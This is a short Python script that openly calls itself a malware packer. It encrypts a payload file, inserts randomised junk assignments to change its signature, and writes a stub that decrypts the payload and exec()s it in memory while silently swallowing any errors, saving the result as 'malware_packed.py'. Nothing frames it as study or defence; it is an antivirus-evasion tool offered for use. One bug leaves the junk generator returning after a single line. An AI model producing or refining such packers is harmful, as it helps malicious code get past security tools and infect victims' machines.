import os
import random
import string
import base64
from cryptography.fernet import Fernet

def generate_junk_code():
    junk = ""
    for _ in range(random.randint(5, 10)):
        var_name = ''.join(random.choices(string.ascii_letters, k=8))
        val = random.randint(1000,99999)
        junk += f"{var_name} = {val} + {random.randint(1,100)}\n"
        return junk
    
def encrypt_payload(filename):
    with open(filename, "rb") as f:
        data = f.read()
    key = Fernet.generate_key()
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    return key, encrypted

def build_stub(encrypted_payload, key):
    stub = f"""
import base64
from cryptography.fernet import Fernet
import ctypes
import sys

{generate_junk_code()}
key = {key}
enc_data = {encrypted_payload}

def decrypt_and_execute():
    try:
        fernet = Fernet(key)
        decrypted = fernet.decrypt(enc_data)
        exec(decrypted)
    except Exception as e:
        pass
    
if __name__ == "__main__":
    decrypt_and_execute()
"""
    return stub

if __name__ == "__main__":
    try:
        key, enc_data = encrypt_payload("payload.py")
        final_code  = build_stub(enc_data, key)
        output = "malware_packed.py"
        with open(output, "w") as f:
            f.write(final_code)
        print(f"[+] Packed malware saved to {output}")
    except Exception as e:
        print(f"[-] Error: {e}")